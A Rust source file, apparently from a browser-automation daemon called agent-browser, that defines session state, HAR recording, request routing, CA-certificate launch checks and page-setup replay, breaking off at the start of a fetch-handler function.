use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};
use std::env;
use std::fs;
use std::hash::{DefaultHasher, Hash, Hasher};
use std::io::Write;
use std::path::PathBuf;
use std::sync::atomic::AtomicU64;
use std::sync::Arc;
use time::{format_description::well_known::Rfc3339, OffsetDateTime};
use tokio::sync::{broadcast, oneshot, RwLock};

use crate::connection::{get_socket_dir, INTERNAL_DAEMON_SHUTDOWN_ACTION};
use crate::session_files::SessionFile;
use crate::session_settings::{
    named, spec, Connection, Effect, Key, Patch, Persist, Requested, Running, Store,
};
use crate::validation::{is_valid_session_name, session_name_error};

use super::a11y;
use super::auth;
use super::browser::{should_track_target, BrowserManager, WaitUntil, WedgeReport};
use super::cdp::chrome::{prepare_nss_home, LaunchOptions};
use super::cdp::client::{is_session_detached_error, CdpClient};
use super::cdp::types::{
    AttachToTargetParams, AttachToTargetResult, CdpEvent, DispatchMouseEventParams,
    ExceptionThrownEvent, GetFullAXTreeResult, JavascriptDialogOpeningEvent, TargetCreatedEvent,
    TargetDestroyedEvent, TargetInfo, TargetInfoChangedEvent,
};
use super::cookies;
use super::diff;
use super::downloads::{DownloadLedger, DownloadState};
use super::element::RefMap;
use super::inspect_server::InspectServer;
use super::interaction;
use super::network::{self, DomainFilter, EventTracker};
use super::policy::{ActionPolicy, ConfirmActions, PolicyResult};
use super::providers;
use super::react;
use super::recording::{self, RecordingState};
use super::screenshot::{self, ScreenshotOptions};
use super::snapshot::{self, SnapshotOptions};
use super::state;
use super::storage;
use super::stream::{self, IdleActivity, StreamServer};
use super::tab_binding;
use super::tracing::{self as native_tracing, TracingState};
use super::webdriver::appium::AppiumManager;
use super::webdriver::backend::{BrowserBackend, WebDriverBackend, WEBDRIVER_UNSUPPORTED_ACTIONS};
use super::webdriver::ios;
use super::webdriver::safari;
use super::webmcp;

/// Wait strategy used by `auth_login` when navigating to the login page.
///
/// We intentionally use `Load` (instead of `NetworkIdle`) because many modern
/// apps keep background requests active indefinitely (polling, analytics,
/// websockets), which can prevent network-idle from ever resolving.
///
/// After navigation completes, `auth_login` explicitly waits for form selectors
/// to appear before filling/clicking.
pub const AUTH_LOGIN_WAIT_UNTIL: WaitUntil = WaitUntil::Load;

/// Poll interval used while waiting for auth form selectors to appear.
const AUTH_LOGIN_SELECTOR_POLL_INTERVAL_MS: u64 = 100;

/// Time spent trying targeted username selectors before broad text-input
/// fallback selectors are allowed.
const AUTH_LOGIN_PREFERRED_SELECTOR_WINDOW_MS: u64 = 5_000;

/// Local snapshot ref used to keep the auth element selected during detection
/// bound to the exact DOM node used by the subsequent interaction.
const AUTH_LOGIN_ELEMENT_REF: &str = "e1";

const AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR: &str = "auth login --no-navigate requires an existing active HTTP(S) browser page; open the login page first";

pub struct PendingConfirmation {
    pub action: String,
    pub cmd: Value,
    approved_actions: Vec<String>,
    /// The flow a `flow_run` was checked against, so the confirmed run
    /// executes the same file rather than one read again from disk.
    flow: Option<Box<super::flow::Flow>>,
}

#[derive(Debug, Clone)]
struct ActiveProviderSession {
    session: providers::ProviderSession,
    plugins: Vec<crate::plugins::PluginConfig>,
}

/// Captured request/response metadata used to export HAR 1.2 files.
#[derive(Clone)]
pub struct HarEntry {
    pub request_id: String,
    /// Seconds since Unix epoch (CDP `wallTime`), with sub-second precision.
    pub wall_time: f64,
    // Request fields
    pub method: String,
    pub url: String,
    pub request_headers: Vec<(String, String)>,
    pub post_data: Option<String>,
    pub request_body_size: i64,
    pub resource_type: String,
    // Response fields — populated by `Network.responseReceived`
    pub status: Option<i64>,
    pub status_text: String,
    /// Normalised from CDP `response.protocol` (e.g. `"h2"` → `"HTTP/2.0"`).
    pub http_version: String,
    pub response_headers: Vec<(String, String)>,
    pub mime_type: String,
    pub redirect_url: String,
    /// Updated by `Network.loadingFinished` for final accuracy.
    pub response_body_size: i64,
    /// Raw CDP `ResourceTiming` object from `Network.responseReceived`.
    pub cdp_timing: Option<Value>,
    /// Monotonic timestamp (seconds) from `Network.loadingFinished`; used to
    /// compute the `receive` timing phase.
    pub loading_finished_timestamp: Option<f64>,
    /// Response body fetched via `Network.getResponseBody` when the entry
    /// finished loading, subject to the active [`HarContentMode`] and size caps.
    pub response_body: Option<String>,
    /// Whether `response_body` is base64-encoded (binary content).
    pub response_body_base64: bool,
    /// The address and port the browser connected to (CDP
    /// `remoteIPAddress` and `remotePort`).
    pub remote_addr: Option<std::net::SocketAddr>,
}

/// Which response bodies to embed in HAR output as `content.text`.
#[derive(Clone, Copy, PartialEq, Eq, Debug, Default)]
pub enum HarContentMode {
    /// Sizes and MIME types only (pre-0.33 behavior).
    None,
    /// Text-like bodies only: JSON, XML, HTML, JS, form data, SVG.
    #[default]
    Text,
    /// Every body; binary content is embedded base64-encoded.
    All,
}

impl HarContentMode {
    pub fn parse(s: &str) -> Result<Self, String> {
        match s {
            "none" => Ok(Self::None),
            "text" => Ok(Self::Text),
            "all" => Ok(Self::All),
            other => Err(format!(
                "Invalid HAR content mode '{}'. Valid options: all, text, none",
                other
            )),
        }
    }
}

/// Bodies larger than this are not embedded in the HAR (the entry keeps its
/// size/MIME metadata either way).
const HAR_MAX_BODY_BYTES: usize = 2 * 1024 * 1024;
/// Total budget for embedded bodies across one recording session.
const HAR_MAX_TOTAL_BODY_BYTES: usize = 64 * 1024 * 1024;

pub struct RouteEntry {
    pub url_pattern: String,
    pub response: Option<RouteResponse>,
    pub abort: bool,
    /// When non-empty, only requests whose `resourceType` (as reported by
    /// CDP Fetch.requestPaused) is in this list are matched. Values are
    /// compared case-insensitively. Empty means "match any resource type".
    pub resource_types: Vec<String>,
}

pub struct RouteResponse {
    pub status: Option<u16>,
    pub body: Option<String>,
    pub content_type: Option<String>,
    pub headers: Option<HashMap<String, String>>,
    /// Origin a page must have to read the mock cross-origin (`--allow-origin`).
    pub allow_origin: Option<String>,
}

#[derive(Clone, serde::Serialize)]
pub struct TrackedRequest {
    pub url: String,
    pub method: String,
    pub headers: Value,
    pub timestamp: u64,
    #[serde(rename = "resourceType")]
    pub resource_type: String,
    #[serde(rename = "requestId")]
    pub request_id: String,
    #[serde(rename = "postData", skip_serializing_if = "Option::is_none")]
    pub post_data: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<i64>,
    #[serde(rename = "responseHeaders", skip_serializing_if = "Option::is_none")]
    pub response_headers: Option<Value>,
    #[serde(rename = "mimeType", skip_serializing_if = "Option::is_none")]
    pub mime_type: Option<String>,
}

pub struct FetchPausedRequest {
    pub request_id: String,
    pub url: String,
    pub resource_type: String,
    pub frame_id: String,
    pub session_id: String,
    /// Original request headers from the Fetch.requestPaused event, needed
    /// because Fetch.continueRequest replaces (not merges) headers.
    pub request_headers: Option<serde_json::Map<String, Value>>,
}

pub enum BackendType {
    Cdp,
    WebDriver,
}

#[derive(Debug, Clone, Default)]
pub struct PendingDialog {
    pub dialog_type: String,
    pub message: String,
    pub url: String,
    pub default_prompt: Option<String>,
    /// Flat CDP session the dialog opened on. A dialog on a background tab
    /// must not block commands targeting the active tab.
    pub session_id: Option<String>,
}

#[derive(Debug, Clone, Copy, Default)]
pub struct MouseState {
    pub x: f64,
    pub y: f64,
    pub buttons: i32,
}

#[derive(Debug, Clone)]
struct SnapshotRevision {
    revision: u64,
    url: String,
    options: String,
    tree: String,
    refs: serde_json::Map<String, Value>,
}

#[derive(Debug, Clone)]
struct ScreenshotObservation {
    revision: u64,
    signature: String,
    decoded_hash: u64,
    width: u32,
    height: u32,
    rgba: Vec<u8>,
}

#[derive(Default)]
struct DrainedEvents {
    pending_acks: Vec<i64>,
    new_targets: Vec<TargetCreatedEvent>,
    changed_targets: Vec<TargetInfoChangedEvent>,
    destroyed_targets: Vec<String>,
    /// Top-level page/webview targets attached by browser-level auto-attach.
    attached_page_sessions: Vec<(TargetInfo, String)>,
    /// Cross-origin iframe (frame_id, session_id) pairs from Target.attachedToTarget.
    attached_iframe_sessions: Vec<(String, String)>,
    /// Worker-like targets that can initiate network traffic but do not support
    /// page-domain setup.
    attached_worker_sessions: Vec<(TargetInfo, String)>,
    /// Attached non-page targets that still need to be resumed when auto-attach
    /// pauses them, even though agent-browser does not track them as tabs.
    attached_other_sessions: Vec<String>,
    /// Session IDs from Target.detachedFromTarget.
    detached_iframe_sessions: Vec<String>,
    /// (request_id, event session_id) pairs from `Network.loadingFinished`
    /// while HAR recording; bodies are fetched for these in
    /// `apply_drained_events` before Chrome evicts them (e.g. on navigation).
    har_finished_requests: Vec<(String, Option<String>)>,
}

fn is_active_iframe_network_event(
    method: &str,
    session_id: Option<&str>,
    tracking_enabled: bool,
    active_iframe_sessions: &HashSet<String>,
) -> bool {
    tracking_enabled
        && method.starts_with("Network.")
        && session_id.is_some_and(|sid| active_iframe_sessions.contains(sid))
}

fn active_frame_scope_may_have_changed(drained: &DrainedEvents) -> bool {
    !drained.attached_iframe_sessions.is_empty()
        || !drained.detached_iframe_sessions.is_empty()
        || !drained.attached_page_sessions.is_empty()
        || !drained.new_targets.is_empty()
        || !drained.destroyed_targets.is_empty()
}

/// Launch fields that only describe a browser agent-browser starts itself. The CLI never
/// sends them with an external target, so a launch that inherits one drops them.
const LOCAL_ONLY_LAUNCH_FIELDS: &[&str] = &[
    "allowFileAccess",
    "args",
    "engine",
    "executablePath",
    "extensions",
    "headless",
    "hideScrollbars",
    "noXvfb",
    "profile",
    "proxy",
    "proxyBypass",
    "storageState",
    "userAgent",
    "webgpu",
];

/// External browser a session attached to. A later launch that names no connection
/// target resolves to it, so the session stays on that browser until `close`.
#[derive(Clone, Debug, PartialEq, Eq)]
enum AttachedTarget {
    CdpUrl(String),
    CdpPort(u64),
    AutoConnect,
    Provider(String),
}

impl AttachedTarget {
    /// Reads the connection target a launch command names, if any.
    fn named_by(cmd: &Value) -> Option<Self> {
        // Blank, zero and false name no browser, here and in the settings.
        if let Some(url) = cmd.get("cdpUrl").and_then(Value::as_str).and_then(named) {
            return Some(Self::CdpUrl(url.to_string()));
        }
        if let Some(port) = cmd
            .get("cdpPort")
            .and_then(Value::as_u64)
            .filter(|port| *port > 0)
        {
            return Some(Self::CdpPort(port));
        }
        if cmd.get("autoConnect").and_then(Value::as_bool) == Some(true) {
            return Some(Self::AutoConnect);
        }
        let provider = cmd
            .get("provider")
            .and_then(Value::as_str)
            .and_then(named)?;
        Some(Self::Provider(provider.to_ascii_lowercase()))
    }

    /// The target a successful launch leaves the session attached to. The iOS and
    /// Safari providers are WebDriver-backed and have no CDP attach to resume.
    fn from_launch_command(cmd: &Value) -> Option<Self> {
        Self::named_by(cmd)
            .filter(|target| !matches!(target, Self::Provider(p) if p == "ios" || p == "safari"))
    }

    fn insert_into(&self, cmd: &mut serde_json::Map<String, Value>) {
        let (key, value) = match self {
            Self::CdpUrl(url) => ("cdpUrl", json!(url)),
            Self::CdpPort(port) => ("cdpPort", json!(port)),
            Self::AutoConnect => ("autoConnect", json!(true)),
            Self::Provider(provider) => ("provider", json!(provider)),
        };
        cmd.insert(key.to_string(), value);
    }
}

/// Points a launch that names no connection target at the browser the session is
/// attached to, without the fields only a local launch honors, so it runs exactly
/// like the original attach. Returns `None` when the launch needs no rewrite.
fn resolve_launch_target(cmd: &Value, attached: Option<&AttachedTarget>) -> Option<Value> {
    let attached = attached?;
    if AttachedTarget::named_by(cmd).is_some() {
        return None;
    }
    let mut resolved = cmd.as_object()?.clone();
    for field in LOCAL_ONLY_LAUNCH_FIELDS {
        resolved.remove(*field);
    }
    attached.insert_into(&mut resolved);
    Some(Value::Object(resolved))
}

fn validate_ca_cert_launch_mode(
    options: &LaunchOptions,
    engine: Option<&str>,
    external_launch: bool,
) -> Result<(), String> {
    if options.ca_cert.is_none() {
        return Ok(());
    }
    if external_launch {
        return Err(
            "CA trust is active for this session and requires a locally launched Chromium browser on Linux. Pass --no-ca-cert to clear it before using CDP, auto-connect, or a provider."
                .to_string(),
        );
    }
    if engine.is_some_and(|value| !value.eq_ignore_ascii_case("chrome")) {
        return Err("--ca-cert is supported only with the Chrome engine on Linux".to_string());
    }
    if options.ignore_https_errors {
        return Err("--ca-cert cannot be combined with --ignore-https-errors".to_string());
    }
    super::browser::validate_launch_options(
        options.extensions.as_deref(),
        false,
        options.profile.as_deref(),
        options.storage_state.as_deref(),
        options.allow_file_access,
        options.executable_path.as_deref(),
        options.ca_cert.as_deref(),
    )
}

#[derive(Clone, Debug)]
struct EffectiveCaCert {
    path: String,
    bundle: crate::ca_bundle::CaBundle,
}

fn resolve_effective_ca_cert(
    cmd: &Value,
    state: &DaemonState,
) -> Result<Option<EffectiveCaCert>, String> {
    let requested_path = cmd.get("caCert").and_then(Value::as_str);
    let clear = cmd
        .get("clearCaCert")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    if requested_path.is_some() && clear {
        return Err("Cannot use --ca-cert with --no-ca-cert".to_string());
    }
    if clear {
        return Ok(None);
    }
    let Some(path) = requested_path else {
        return Ok(state.effective_ca_cert.clone());
    };
    let bundle = crate::ca_bundle::load(path)?;
    if state
        .effective_ca_cert
        .as_ref()
        .is_some_and(|current| current.bundle.digest() == bundle.digest())
    {
        return Ok(state.effective_ca_cert.clone());
    }
    Ok(Some(EffectiveCaCert {
        path: path.to_string(),
        bundle,
    }))
}

fn apply_effective_ca_cert(
    options: &mut LaunchOptions,
    effective_ca_cert: &Option<EffectiveCaCert>,
) {
    options.ca_cert = effective_ca_cert.as_ref().map(|ca| ca.path.clone());
    options.ca_bundle = effective_ca_cert.as_ref().map(|ca| ca.bundle.clone());
    options.ca_cert_digest = effective_ca_cert.as_ref().map(|ca| *ca.bundle.digest());
}

/// Arguments of the last `Emulation.setEmulatedMedia` call, kept so the same
/// emulation can be replayed onto a new page session.
#[derive(Debug, Clone)]
pub struct EmulatedMedia {
    pub media: Option<String>,
    /// `(name, value)` media features, e.g. `("prefers-color-scheme", "dark")`.
    pub features: Vec<(String, String)>,
}

/// An init script tracked across target sessions.
///
/// Chrome assigns script identifiers independently in each target session, so
/// two tabs can both return the same identifier for different scripts. The
/// daemon-owned `identifier` is the user-facing handle, while
/// `session_identifiers` records the target-local identifier to send when
/// removing it from a particular target.
#[derive(Debug, Clone)]
pub struct InitScriptSetup {
    pub identifier: String,
    pub source: String,
    pub session_identifiers: HashMap<String, String>,
}

/// Page-level setup the daemon has applied to the active page session.
///
/// CDP scopes all of these to a single target session, so a tab the daemon
/// creates itself starts without them. This record lets
/// [`apply_session_setup`] replay them onto the new tab before its first
/// navigation. Reset whenever a browser is (re)launched. Permissions are not
/// tracked: `Browser.grantPermissions` is context-scoped and already covers
/// new tabs in the default context.
#[derive(Debug, Default, Clone)]
pub struct SessionSetup {
    /// `--user-agent`, `useragent`, or the UA half of `device`.
    pub user_agent: Option<String>,
    /// Last `Emulation.setEmulatedMedia` call: `--color-scheme` at launch or
    /// `set_media` / `emulatemedia`.
    pub emulated_media: Option<EmulatedMedia>,
    pub timezone: Option<String>,
    pub locale: Option<String>,
    /// `(latitude, longitude, accuracy)`.
    pub geolocation: Option<(f64, f64, Option<f64>)>,
    /// Global headers from the `headers` and `credentials` commands
    /// (`Network.setExtraHTTPHeaders`). Origin-scoped `--headers` live in
    /// `DaemonState::origin_headers`.
    pub extra_headers: Option<HashMap<String, String>>,
    pub offline: Option<bool>,
    /// Init scripts registered with `Page.addScriptToEvaluateOnNewDocument`:
    /// `--enable`, `--init-script`, plugin init scripts, and `addinitscript`.
    pub init_scripts: Vec<InitScriptSetup>,
    /// Monotonic source for daemon-owned init-script handles. CDP identifiers
    /// cannot be used here because each target session allocates them
    /// independently, commonly starting at `1`.
    next_init_script_handle: u64,
}

impl SessionSetup {
    fn from_launch_options(options: &LaunchOptions) -> Self {
        Self {
            user_agent: options.user_agent.clone(),
            emulated_media: options.color_scheme.as_ref().map(|scheme| EmulatedMedia {
                media: None,
                features: vec![("prefers-color-scheme".to_string(), scheme.clone())],
            }),
            ..Self::default()
        }
    }

    /// True when nothing has been configured, so there is nothing to replay.
    fn is_empty(&self) -> bool {
        self.user_agent.is_none()
            && self.emulated_media.is_none()
            && self.timezone.is_none()
            && self.locale.is_none()
            && self.geolocation.is_none()
            && self.extra_headers.as_ref().is_none_or(HashMap::is_empty)
            && !self.offline.unwrap_or(false)
            && self.init_scripts.is_empty()
    }

    fn register_init_script(
        &mut self,
        source: String,
        session_id: String,
        session_identifier: String,
    ) -> String {
        self.next_init_script_handle += 1;
        let identifier = format!("init-script-{}", self.next_init_script_handle);
        let mut session_identifiers = HashMap::new();
        session_identifiers.insert(session_id, session_identifier);
        self.init_scripts.push(InitScriptSetup {
            identifier: identifier.clone(),
            source,
            session_identifiers,
        });
        identifier
    }
}

pub struct DaemonState {
    pub browser: Option<BrowserManager>,
    pub appium: Option<AppiumManager>,
    pub safari_driver: Option<safari::SafariDriverProcess>,
    pub webdriver_backend: Option<super::webdriver::backend::WebDriverBackend>,
    pub backend_type: BackendType,
    pub ref_map: RefMap,
    /// Last delta snapshot per page session. Bounded to the currently tracked tabs.
    snapshot_revisions: HashMap<String, SnapshotRevision>,
    screenshot_observations: HashMap<(String, String), ScreenshotObservation>,
    pub domain_filter: Arc<RwLock<Option<DomainFilter>>>,
    pub event_tracker: EventTracker,
    pub session_name: Option<String>,
    pub restore_save: String,
    pub restore_check_url: Option<String>,
    pub restore_check_text: Option<String>,
    pub restore_check_fn: Option<String>,
    pub restore_status: String,
    pub restore_status_detail: Option<String>,
    /// Origins whose storage the last launch-time restore skipped because the page left that origin.
    pub restore_skipped_origins: Vec<String>,
    pub restore_loaded_path: Option<String>,
    pub restore_load_failed: bool,
    pub restore_validation_pending: bool,
    pub restore_save_status: String,
    pub restore_saved_path: Option<String>,
    /// When the most recent browser-touching command finished. Periodic
    /// autosaves wait for a quiet period after this so a multi-second save
    /// never lands in the middle of an active command burst.
    pub last_command_finished: Option<std::time::Instant>,
    /// When session state was last saved or a periodic autosave last failed,
    /// used to enforce the minimum interval between periodic saves.
    pub last_autosave_attempt: Option<std::time::Instant>,
    pub session_id: String,
    /// The settings this session runs with.
    pub settings: Running,
    /// Where the security settings are kept across daemon restarts.
    store: Arc<dyn Store>,
    pub tracing_state: TracingState,
    pub recording_state: RecordingState,
    event_rx: Option<broadcast::Receiver<CdpEvent>>,
    /// Downloads seen on the attached browser, for `wait --download`.
    downloads: DownloadLedger,
    pub webmcp: webmcp::RuntimeState,
    /// Whether the active launch opted into Chrome's experimental WebMCP features.
    pub webmcp_enabled: bool,
    pub screencasting: bool,
    pub policy: Option<ActionPolicy>,
    pub pending_confirmation: Option<PendingConfirmation>,
    /// A flow handed from a confirmation to the re-executed `flow_run`.
    preloaded_flow: Option<Box<super::flow::Flow>>,
    pub har_recording: bool,
    pub har_entries: Vec<HarEntry>,
    /// Commands and request tags captured by `flow start`.
    pub flow: super::flow::FlowRecorder,
    /// Registrable domain whose saved flows were last announced.
    pub flow_hinted: Option<String>,
    /// Why the last `flow run` stopped, for the error response.
    pub flow_stop: Option<Value>,
    pub har_content_mode: HarContentMode,
    /// Bytes of response bodies embedded so far this recording; enforces
    /// [`HAR_MAX_TOTAL_BODY_BYTES`].
    pub har_body_total_bytes: usize,
    /// When each recorded request last received its headers or body bytes.
    pub har_progress: HashMap<String, std::time::Instant>,
    pub confirm_actions: Option<ConfirmActions>,
    pub inspect_server: Option<InspectServer>,
    pub routes: Arc<RwLock<Vec<RouteEntry>>>,
    pub tracked_requests: Vec<TrackedRequest>,
    pub request_tracking: bool,
    pub active_frame_id: Option<String>,
    /// Cross-origin iframe frame_id → dedicated CDP session_id.
    /// Populated by Target.attachedToTarget events from Target.setAutoAttach.
    /// Entries are retained across tab changes because Chrome does not emit a
    /// second attachment event when returning to an already-attached tab.
    /// Target.detachedFromTarget events remove stale sessions.
    pub iframe_sessions: HashMap<String, String>,
    /// Dedicated iframe sessions reachable from the currently active page.
    /// Network tracking uses this subset so background-tab iframe traffic is
    /// not mixed into the active tab's request list or HAR capture.
    pub active_iframe_sessions: HashSet<String>,
    /// Origin-scoped extra HTTP headers set via `--headers` on navigate.
    /// Key is the origin (scheme + host + port), value is the headers map.
    /// Wrapped in Arc<RwLock<>> so the background Fetch handler can read it.
    pub origin_headers: Arc<RwLock<HashMap<String, HashMap<String, String>>>>,
    /// Last document URL the domain filter blocked, keyed by frame ID, so
    /// navigation can report a redirect that landed on the blocked page.
    pub blocked_documents: Arc<std::sync::Mutex<HashMap<String, String>>>,
    /// Proxy authentication credentials (username, password) for handling
    /// Fetch.authRequired events from authenticated proxies.
    pub proxy_credentials: Arc<RwLock<Option<(String, String)>>>,
    /// Background task that processes Fetch.requestPaused events in real-time,
    /// handling domain filtering, route interception, and origin-scoped headers
    /// without deadlocking navigation/evaluate.
    fetch_handler_task: Option<tokio::task::JoinHandle<()>>,
    /// Background task that auto-accepts `alert` and `beforeunload` dialogs
    /// so they never block the agent.
    dialog_handler_task: Option<tokio::task::JoinHandle<()>>,
    pub mouse_state: MouseState,
    /// Session-wide pointer behavior, configured by `--input-mode`.
    pub input_mode: String,
    /// Tracks the currently open JavaScript dialog (alert/confirm/prompt), if any.
    pub pending_dialog: Option<PendingDialog>,
    /// A `page_wedged` report whose response may not have reached the client,
    /// keyed by the request id. The client's read timeout can expire before
    /// the daemon finishes replacing the tab, so a retry of the same request
    /// gets the report instead of running on the blank replacement tab.
    pub undelivered_wedge: Option<(String, WedgeReport)>,
    /// A mouse button left logically down because a dialog opened between
    /// mousePressed and mouseReleased; released when the dialog is resolved.
    pub pending_pointer_release: Option<super::interaction::PendingRelease>,
    /// When true, automatically dismiss `beforeunload` dialogs and accept `alert`
    /// dialogs so they never block the agent.  Enabled by default.
    pub auto_dialog: bool,
    /// Shared slot for stream server to receive CDP client when browser launches.
    pub stream_client: Option<Arc<RwLock<Option<Arc<CdpClient>>>>>,
    /// Stream server instance kept alive so the broadcast channel remains open.
    pub stream_server: Option<Arc<StreamServer>>,
    /// Daemon-owned activity clock shared by commands and stream servers.
    pub idle_activity: Arc<IdleActivity>,
    /// Hash of launch options used for the current browser, for relaunch detection.
    launch_identity: Option<u64>,
    /// CDP endpoint and headers from the last explicit CDP launch, reused when
    /// the daemon reconnects to that same endpoint on its own.
    cdp_headers: Option<(String, Vec<(String, String)>)>,
    /// External browser this session attached to; target-less launches resolve to it.
    attached_target: Option<AttachedTarget>,
    effective_ca_cert: Option<EffectiveCaCert>,
    /// Whether browser-level auto-attach has been enabled for the current
    /// browser so top-level popups pause before their first request.
    network_auto_attach_installed: bool,
    /// Browser engine name (e.g. "chrome", "lightpanda") for observability.
    pub engine: String,
    /// Default timeout for wait operations, from AGENT_BROWSER_DEFAULT_TIMEOUT env var.
    pub default_timeout_ms: u64,
    /// Last viewport settings (width, height, deviceScaleFactor, mobile),
    /// re-applied to new contexts (e.g., recording).
    pub viewport: Option<(i32, i32, f64, bool)>,
    /// Session-scoped setup applied to the active page, re-applied to tabs the
    /// daemon creates. See [`SessionSetup`].
    pub session_setup: SessionSetup,
    /// Init script sources returned by launch mutator plugins for this launch.
    pub plugin_init_scripts: Vec<String>,
    /// Provider cleanup metadata for the active external browser session.
    active_provider_session: Option<ActiveProviderSession>,
    /// True when the connected CDP browser is owned by a cloud provider.
    ///
    /// This is tracked separately from cleanup metadata because provider
    /// plugins are allowed to omit a close-session payload.
    active_provider_connection: bool,
    /// Browser product already checked for an outdated build, so each product is checked once even when the fetch fails.
    browser_security_checked: Option<String>,
    /// Actions already approved while replaying a confirmed command.
    confirmed_policy_actions: HashSet<String>,
    /// Strict session-to-tab binding (`--pin-tab` / AGENT_BROWSER_PIN_TAB).
    /// Sticky per session: persisted in the binding file so later commands
    /// and daemon restarts keep the strict semantics.
    pub pin_tab: bool,
    /// Last binding written to disk, so persistence is write-on-change.
    last_persisted_binding: Option<tab_binding::TabBinding>,
}

fn default_idle_shutdown_is_blocked(
    is_webdriver: bool,
    provider_owned: bool,
    browser_blocks_shutdown: bool,
) -> bool {
    is_webdriver || (!provider_owned && browser_blocks_shutdown)
}

impl DaemonState {
    /// The client received the `page_wedged` response to request `id`, so it
    /// is not replayed. A newer report from another request stays pending.
    pub fn wedge_report_delivered(&mut self, id: &str) {
        if self
            .undelivered_wedge
            .as_ref()
            .is_some_and(|(wedged_id, _)| wedged_id == id)
        {
            self.undelivered_wedge = None;
        }
    }

    /// A session seeded from the environment whose security settings are kept
    /// in memory only.
    #[cfg(test)]
    pub fn new() -> Self {
        Self::with_store(
            Running::from_env(),
            Arc::new(crate::session_settings::MemStore::default()),
        )
    }

    /// A session that starts with `settings` and keeps its security settings
    /// in `store`.
    pub fn with_store(settings: Running, store: Arc<dyn Store>) -> Self {
        let session_id =
            env::var("AGENT_BROWSER_SESSION").unwrap_or_else(|_| "default".to_string());
        let security = settings.security();
        let restore = settings.restore();
        // A corrupt binding file is surfaced later, on attach; it does not
        // enable pinning here because its pinned state is unknowable.
        let pin_tab = settings.pin_tab()
            || tab_binding::load(&session_id)
                .ok()
                .flatten()
                .is_some_and(|b| b.pinned);
        Self {
            browser: None,
            appium: None,
            safari_driver: None,
            webdriver_backend: None,
            backend_type: BackendType::Cdp,
            ref_map: RefMap::new(),
            snapshot_revisions: HashMap::new(),
            screenshot_observations: HashMap::new(),
            domain_filter: Arc::new(RwLock::new(
                // An empty list is no filter, as when it is cleared live.
                security
                    .allowed_domains
                    .as_ref()
                    .filter(|domains| !domains.is_empty())
                    .map(|domains| DomainFilter::new(&domains.join(","))),
            )),
            event_tracker: EventTracker::new(),
            session_name: restore.key,
            restore_save: restore.save,
            restore_check_url: restore.check_url,
            restore_check_text: restore.check_text,
            restore_check_fn: restore.check_fn,
            restore_status: "not_configured".to_string(),
            restore_status_detail: None,
            restore_skipped_origins: Vec::new(),
            restore_loaded_path: None,
            restore_load_failed: false,
            restore_validation_pending: false,
            restore_save_status: "not_attempted".to_string(),
            restore_saved_path: None,
            last_command_finished: None,
            last_autosave_attempt: None,
            session_id,
            engine: settings.engine().unwrap_or_else(|| "chrome".to_string()),
            // Intentionally below the CLI's 30s IPC read timeout (see
            // `DEFAULT_TIMEOUT_MS`).
            default_timeout_ms: settings.default_timeout_ms(),
            auto_dialog: !settings.no_auto_dialog(),
            tracing_state: TracingState::new(),
            recording_state: RecordingState::new(),
            event_rx: None,
            downloads: DownloadLedger::default(),
            webmcp: webmcp::RuntimeState::default(),
            webmcp_enabled: false,
            screencasting: false,
            policy: security
                .action_policy_path
                .as_deref()
                .map(ActionPolicy::from_path),
            pending_confirmation: None,
            preloaded_flow: None,
            har_recording: false,
            har_entries: Vec::new(),
            flow: Default::default(),
            flow_hinted: None,
            flow_stop: None,
            har_content_mode: HarContentMode::default(),
            har_body_total_bytes: 0,
            har_progress: HashMap::new(),
            confirm_actions: security
                .confirm_actions
                .as_deref()
                .and_then(ConfirmActions::parse),
            inspect_server: None,
            routes: Arc::new(RwLock::new(Vec::new())),
            tracked_requests: Vec::new(),
            request_tracking: false,
            active_frame_id: None,
            iframe_sessions: HashMap::new(),
            active_iframe_sessions: HashSet::new(),
            origin_headers: Arc::new(RwLock::new(HashMap::new())),
            blocked_documents: Arc::new(std::sync::Mutex::new(HashMap::new())),
            proxy_credentials: Arc::new(RwLock::new(None)),
            fetch_handler_task: None,
            dialog_handler_task: None,
            mouse_state: MouseState::default(),
            input_mode: "instant".to_string(),
            pending_dialog: None,
            undelivered_wedge: None,
            pending_pointer_release: None,
            stream_client: None,
            stream_server: None,
            idle_activity: Arc::new(IdleActivity::new()),
            launch_identity: None,
            cdp_headers: None,
            attached_target: None,
            effective_ca_cert: None,
            network_auto_attach_installed: false,
            viewport: None,
            session_setup: SessionSetup::default(),
            plugin_init_scripts: Vec::new(),
            active_provider_session: None,
            active_provider_connection: false,
            browser_security_checked: None,
            confirmed_policy_actions: HashSet::new(),
            pin_tab,
            last_persisted_binding: None,
            settings,
            store,
        }
    }

    /// True when the default idle timeout must not shut down this session.
    /// WebDriver-backed Safari and iOS sessions are always headed, while CDP
    /// sessions delegate the decision to BrowserManager. Provider-owned CDP
    /// connections remain eligible because the daemon owns their lifecycle.
    pub(crate) fn blocks_default_idle_shutdown(&self) -> bool {
        default_idle_shutdown_is_blocked(
            matches!(self.backend_type, BackendType::WebDriver),
            self.active_provider_connection,
            self.browser
                .as_ref()
                .is_some_and(BrowserManager::blocks_default_idle_shutdown),
        )
    }

    /// Extract the timeout from a command JSON, falling back to the
    /// configured `default_timeout_ms` (from `AGENT_BROWSER_DEFAULT_TIMEOUT`).
    /// All wait-family handlers should use this instead of reading the
    /// timeout field and providing their own fallback.
    fn timeout_ms(&self, cmd: &Value) -> u64 {
        cmd.get("timeout")
            .and_then(|v| v.as_u64())
            .unwrap_or(self.default_timeout_ms)
    }

    fn reset_input_state(&mut self) {
        self.mouse_state = MouseState::default();
    }

    /// Create state with an optional stream client slot and server instance
    /// (for daemon startup with stream server).
    pub fn new_with_stream(
        settings: Running,
        store: Arc<dyn Store>,
        stream_client: Option<Arc<RwLock<Option<Arc<CdpClient>>>>>,
        stream_server: Option<Arc<StreamServer>>,
        idle_activity: Arc<IdleActivity>,
    ) -> Self {
        let mut s = Self::with_store(settings, store);
        if stream_server.is_some() {
            s.request_tracking = true;
        }
        s.stream_client = stream_client;
        s.stream_server = stream_server;
        s.idle_activity = idle_activity;
        s
    }

    fn subscribe_to_browser_events(&mut self) {
        self.downloads.clear();
        if let Some(ref browser) = self.browser {
            self.event_rx = Some(browser.client.subscribe());
        }
    }

    /// Start the background task that processes Fetch.requestPaused and
    /// Fetch.authRequired events in real-time (domain filtering, route
    /// interception, origin-scoped headers, proxy authentication).
    /// Must be called after the browser is set and events are subscribed.
    fn start_fetch_handler(&mut self) {
